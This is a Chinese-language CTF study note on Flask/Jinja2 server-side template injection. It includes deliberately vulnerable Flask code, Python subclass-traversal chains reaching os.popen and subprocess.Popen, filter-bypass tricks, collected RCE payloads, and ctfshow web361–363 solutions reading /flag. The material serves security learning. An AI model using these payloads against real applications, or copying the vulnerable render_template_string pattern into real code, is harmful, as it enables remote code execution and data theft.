# 基础

<img src="图片\jJr7ljgenHmgP7kRYOjVng.png" alt="jJr7ljgenHmgP7kRYOjVng" style="zoom:67%;" />

1、什么是SSTI？有什么漏洞危害？

漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。

2、如何判断检测SSTI漏洞的存在？

-输入的数据会被浏览器利用当前脚本语言调用解析执行

3、SSTI会产生在那些语言开发应用？

-见上图

4、SSTI安全问题在生产环境那里产生？

-存在模版引用的地方，如404错误页面展示

-存在数据接收引用的地方，如模版解析获取参数数据

## 例子

```python
from flask import Flask
from flask import request
from flask import config
from flask import render_template_string
app = Flask(__name__)

app.config['SECRET_KEY'] = "flag{SSTI_123456}"
@app.route('/')
def hello_world():
    return 'Hello World!'

@app.errorhandler(404)
def page_not_found(e):
    template = '''
{%% block body %%}
    <div class="center-content error">
        <h1>Oops! That page doesn't exist.</h1>
        <h3>%s</h3>
    </div> 
{%% endblock %%}
''' % (request.args.get('404_url'))
    return render_template_string(template), 404

if __name__ == '__main__':
    app.run(host='0.0.0.0',debug=True)
```

重要函数 render_template_string()

<img src="图片\Snipaste_2023-01-28_15-34-24.png" alt="Snipaste_2023-01-28_15-34-24" style="zoom:67%;" />

## CTFHUB

[WesternCTF]  https://blog.csdn.net/houyanhua1/article/details/85470175

```python
import flask
import os

app = flask.Flask(__name__)

app.config['FLAG'] = os.environ.pop('FLAG')


@app.route('/')
def index():
    return open(__file__).read()


@app.route('/shrine/<path:shrine>')
def shrine(shrine):

    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s

    return flask.render_template_string(safe_jinja(shrine))


if __name__ == '__main__':
    app.run(debug=True, port=80)
```

```
url_for()函数是用于构建操作指定函数的URL
get_flashed_messages()函数是获取传递过来的数据
/shrine/{{url_for.__globals__}}
/shrine/{{url_for.__globals__['current_app'].config}}
/shrine/{{get_flashed_messages.__globals__}}
/shrine/{{get_flashed_messages.__globals__['current_app'].config}}
```

## 跟随文章

https://xz.aliyun.com/t/3679

https://blog.csdn.net/qq_46918279/article/details/121270806

```python
from flask import Flask
from flask import render_template
from flask import request
from flask import render_template_string

app = Flask(__name__)
@app.route('/test',methods=['GET', 'POST'])
def test():
    template = '''
        <div class="center-content error">
            <h1>Oops! That page doesn't exist.</h1>
            <h3>%s</h3>
        </div> 
    ''' %(request.url)

    return render_template_string(template)

if __name__ == '__main__':
    app.debug = True
    app.run()
```

我们在pycharm中运行代码

```
print("".__class__)
```

返回了<class 'str'>，对于一个空字符串他已经打印了str类型，在python中，每个类都有一个**bases**属性，列出其基类。现在我们写代码。

```
print("".__class__.__bases__)
```

打印返回 (<class 'object'>,)，我们已经找到了他的基类object，而我们想要寻找object类的不仅仅只有bases，同样可以使用**mro**，**mro**给出了method resolution order，即解析方法调用的顺序。我们实例打印一下mro。

```
print("".__class__.__mro__)
```

可以看到返回了(<class 'str'>, <class 'object'>)，同样可以找到object类，正是由于这些但不仅限于这些方法，我们才有了各种沙箱逃逸的姿势。正如上面的解释，**mro**返回了解析方法调用的顺序，将会打印两个。在flask ssti中poc中很大一部分是从object类中寻找我们可利用的类的方法。我们这里只举例最简单的。接下来我们增加代码。接下来我们使用subclasses,**subclasses**() 这个方法，这个方法返回的是这个类的子类的集合，也就是object类的子类的集合。

```
print("".__class__.__bases__[0].__subclasses__())
```

```
print("".__class__.__bases__[0].__subclasses__()[133])
```

接下来就是我们需要找到合适的类，然后从合适的类中寻找我们需要的方法。这里开始我们不再用pycharm打印了，直接利用上面我们已经搭建好的漏洞环境来进行测试。通过我们在如上这么多类中一个一个查找，找到我们可利用的类，这里举例一种。<class 'os._wrap_close'>，os命令相信你看到就感觉很亲切。我们正是要从这个类中寻找我们可利用的方法，通过大概猜测找到是第119个类，0也对应一个类，所以这里写[133]。可以用 editplus 替换 , 为 \n 再看行数，看数组

```
?XXX={{"".__class__.__bases__[0].__subclasses__()[133]}}
```

此时我们可以在网页上看到各种各样的参数方法函数。我们找其中一个可利用的function popen，在python2中可找file读取文件，很多可利用方法，详情可百度了解下

```
{{"".__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['popen']('dir').read()}}
```

<img src="图片\Snipaste_2023-01-28_16-35-10.png" alt="Snipaste_2023-01-28_16-35-10" style="zoom:67%;" />

### ctf中的一些绕过tips

没什么系统思路。就是不断挖掘类研究官方文档以及各种能够利用的姿势。这里从最简单的绕过说起。

1.过滤[]等括号

使用gititem绕过。如原 poc `{{"".class.bases[0]}}`

绕过后 `{{"".class.bases.getitem(0)}}`

2.过滤了subclasses，拼凑法

原 poc {`{"".class.bases[0].subclasses()}}`

绕过 {{"".class.bases[0]['**subcla'+'sses**'](https://xz.aliyun.com/t/3679)}}

3.过滤class

使用session

poc {{session['cla'+'ss'].bases[0].bases[0].bases[0].bases[0].subclasses()[118]}}

多个bases[0]是因为一直在向上找object类。使用mro就会很方便

```
{{session['__cla'+'ss__'].__mro__[12]}}
```

或者

```
request['__cl'+'ass__'].__mro__[12]}}
```

4.timeit姿势

可以学习一下 2017 swpu-ctf的一道沙盒python题，

这里不详说了，博大精深，我只意会一二。

```
import timeit
timeit.timeit("__import__('os').system('dir')",number=1)

import platform
print platform.popen('dir').read()
```

5.收藏的一些poc

```
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls  /var/www/html").read()' )

object.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')

{{request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]['__in'+'it__']['__'+'glo'+'bal'+'s__']['__bu'+'iltins__']['ev'+'al']('__im'+'port__("os").po'+'pen("ca"+"t a.php").re'+'ad()')}}
```

# ctfshow

## web361

```
<div class="center-content error">
        <h1>Hello</h1>
        <h3>None</h3>
    </div> 
```

```
?name={{"".__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[%27popen%27]("cat%20/flag").read()}}
```

<img src="图片\Snipaste_2023-01-19_18-36-44.png" alt="Snipaste_2023-01-19_18-36-44"  />

## web362

web362-过滤部分数字

过滤了2、3等数字，os._wrap_close这个类没法使用，思考利用subprocess.Popen()

**payload**

```
?name={{().__class__.__mro__[1].__subclasses__()[407]("cat /flag",shell=True,stdout=-1).communicate()[0]}}
```

## web363

```
过滤单双引号，考虑使用get传参绕过

payload

?name={{().__class__.__mro__[1].__subclasses__()[407](request.args.a,shell=True,stdout=-1).communicate()[0]}}&a=cat /flag
```

